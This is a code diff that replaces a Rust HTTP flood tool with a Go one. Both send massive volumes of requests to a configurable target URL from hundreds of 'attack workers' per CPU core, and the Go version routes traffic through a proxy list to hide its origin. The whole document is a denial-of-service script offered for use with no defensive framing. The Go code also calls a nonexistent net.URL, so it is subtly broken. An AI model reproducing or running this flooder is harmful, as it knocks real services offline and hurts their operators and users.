@@ -1,63 +1,111 @@
-use hyper::{Client, Uri};
-use hyper::client::HttpConnector;
-use hyper_tls::HttpsConnector;
-use tokio::sync::Semaphore;
-use std::sync::Arc;
-use tokio::task;
-use tokio::time::{sleep, Duration};
-use num_cpus;
+package main
 
-const TARGET: &str = "https://example.com"; // Change to your target
-const THREADS_PER_CORE: usize = 500;
-const UPDATE_INTERVAL: Duration = Duration::from_secs(1);
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"fmt"
+	"net"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+	"runtime"
+	"golang.org/x/net/http2"
+)
 
-#[tokio::main]
-async fn main() {
-    let total_requests = Arc::new(tokio::sync::Mutex::new(0u64));
-    let semaphore = Arc::new(Semaphore::new(num_cpus::get() * THREADS_PER_CORE));
+const (
+	TargetURL      = "https://example.com" // Change this
+	ThreadsPerCore = 500
+	RequestPerConn = 1000000
+	ProxyFile      = "proxy.txt"
+)
 
-    // Request counter
-    let total_requests_clone = total_requests.clone();
-    tokio::spawn(async move {
-        loop {
-            sleep(UPDATE_INTERVAL).await;
-            let count = *total_requests_clone.lock().await;
-            println!("\rRequests Sent: {}", count);
-        }
-    });
+var (
+	proxies     []string
+	requestsSent uint64
+	client      *http.Client
+)
 
-    // HTTPS Connector
-    let https = HttpsConnector::new();
-    let client = Client::builder().http2_only(true).build::<_, hyper::Body>(https);
+// Load proxies from file
+func loadProxies() {
+	file, err := os.Open(ProxyFile)
+	if err != nil {
+		fmt.Println("No proxy file found, using direct connections.")
+		return
+	}
+	defer file.Close()
 
-    // Start attack workers
-    let mut handles = Vec::new();
-    for _ in 0..num_cpus::get() * THREADS_PER_CORE {
-        let total_requests = total_requests.clone();
-        let client = client.clone();
-        let semaphore = semaphore.clone();
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		proxies = append(proxies, scanner.Text())
+	}
+}
 
-        let handle = task::spawn(async move {
-            loop {
-                let _permit = semaphore.acquire().await.unwrap();
-                
-                let req = hyper::Request::builder()
-                    .uri(TARGET)
-                    .header("User-Agent", "Mozilla/5.0")
-                    .body(hyper::Body::empty())
-                    .unwrap();
+// Create HTTP/2 compatible client
+func createClient(proxy string) *http.Client {
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
 
-                if client.request(req).await.is_ok() {
-                    *total_requests.lock().await += 1;
-                }
-            }
-        });
+	if proxy != "" {
+		transport.Proxy = http.ProxyURL(&net.URL{Host: proxy})
+	}
 
-        handles.push(handle);
-    }
+	http2.ConfigureTransport(transport)
+	return &http.Client{
+		Transport: transport,
+		Timeout:   5 * time.Second,
+	}
+}
 
-    // Wait for all tasks
-    for handle in handles {
-        handle.await.unwrap();
-    }
+func attackWorker(wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	proxy := ""
+	if len(proxies) > 0 {
+		proxy = proxies[int(time.Now().UnixNano())%len(proxies)]
+	}
+
+	client := createClient(proxy)
+
+	for i := 0; i < RequestPerConn; i++ {
+		req, err := http.NewRequest("GET", TargetURL, nil)
+		if err != nil {
+			continue
+		}
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+		req.Header.Set("Connection", "keep-alive")
+
+		resp, err := client.Do(req)
+		if err == nil {
+			resp.Body.Close()
+			atomic.AddUint64(&requestsSent, 1)
+		}
+	}
+}
+
+func main() {
+	loadProxies()
+	runtime.GOMAXPROCS(runtime.NumCPU())
+
+	var wg sync.WaitGroup
+
+	// Start attack workers
+	for i := 0; i < runtime.NumCPU()*ThreadsPerCore; i++ {
+		wg.Add(1)
+		go attackWorker(&wg)
+	}
+
+	// Display request count every second
+	go func() {
+		for {
+			time.Sleep(1 * time.Second)
+			fmt.Printf("Requests sent: %d\n", atomic.LoadUint64(&requestsSent))
+		}
+	}()
+
+	wg.Wait()
 }
